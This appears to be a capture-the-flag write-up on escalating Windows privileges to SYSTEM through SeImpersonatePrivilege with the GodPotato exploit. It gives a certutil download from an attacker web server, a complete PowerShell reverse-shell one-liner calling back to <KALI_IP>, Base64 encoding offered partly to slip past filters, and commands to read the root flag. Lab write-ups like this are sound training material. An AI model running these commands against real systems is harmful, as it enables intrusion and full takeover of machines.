text: The discovery of <highlight>SeImpersonatePrivilege</highlight> is a critical finding. This privilege allows a process to impersonate a client after authentication. By using an exploit from the 'Potato' family, we can trick a SYSTEM-level service into authenticating with us, capturing its token, and spawning a shell as <highlight>NT AUTHORITY\SYSTEM</highlight>.
Step 1: Transferring the Exploit to Target
We move the <highlight>GodPotato-Net4.exe</highlight> binary from our Kali machine to the Windows target using <highlight>certutil.exe</highlight>.

code:
# On Kali (Start a web server)
python3 -m http.server 80

# On Windows Shell
certutil -urlcache -f http://<KALI_IP>/GodPotato-Net4.exe gp.exe

text: Step 2: Executing GodPotato for SYSTEM Shell
First, we verify the exploit works by running a simple <highlight>whoami</highlight>. If successful, it confirms we can impersonate the SYSTEM token.

code:
[*] Starting the DCOM server...
[*] Triggering the authentication...
[*] Impersonating the SYSTEM token...
nt authority\system

text: Step 2.1: The Raw Reverse Shell Payload

We use GodPotato to execute a PowerShell reverse shell one-liner. However, directly passing complex symbols like <highlight>$</highlight>, <highlight>"</highlight>, and <highlight>()</highlight> inside the <highlight>-cmd</highlight> flag often causes the command to break or get blocked by security filters.

To ensure the shell executes correctly and bypasses simple syntax errors, we must convert the raw payload into <highlight>Base64 (UTF-16LE)</highlight>. This allows us to use the <highlight>-EncodedCommand</highlight> flag, making the execution much more stable under GodPotato.

code:
# On Kali: Convert the raw shell to Base64
echo -n '$c=New-Object Net.Sockets.TCPClient("<KALI_IP>",9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=([Text.Encoding]::ASCII).GetBytes($sb);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close()' | iconv -t utf-16le | base64 -w 0

# Execute the Encoded Payload via GodPotato
.\gp.exe -cmd "powershell -EncodedCommand <BASE64_STRING>"

text: With SYSTEM privileges, we perform a final enumeration to list all users, identify their directories, and locate the root flag filename before reading its content.

code:
# 1. List all system users to confirm targets
.\gp.exe -cmd "cmd.exe /c net user"

# 2. List the Users directory to check folder structure
.\gp.exe -cmd "cmd.exe /c dir C:\Users"

# 3. List the Administrator's Desktop to find the root flag name
.\gp.exe -cmd "cmd.exe /c dir C:\Users\Administrator\Desktop"

# 4. Final Capture: Read the root flag content
.\gp.exe -cmd "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"

title: Potato Attack Mechanism Summary
items: Vulnerability: SeImpersonatePrivilege (Standard on many service accounts)
Exploit: GodPotato triggers a DCOM/RPC call to force SYSTEM authentication
Stability: Base64 encoding prevents syntax breaking within the -cmd argument
Outcome: Full Administrative control (NT AUTHORITY\SYSTEM) over the machine
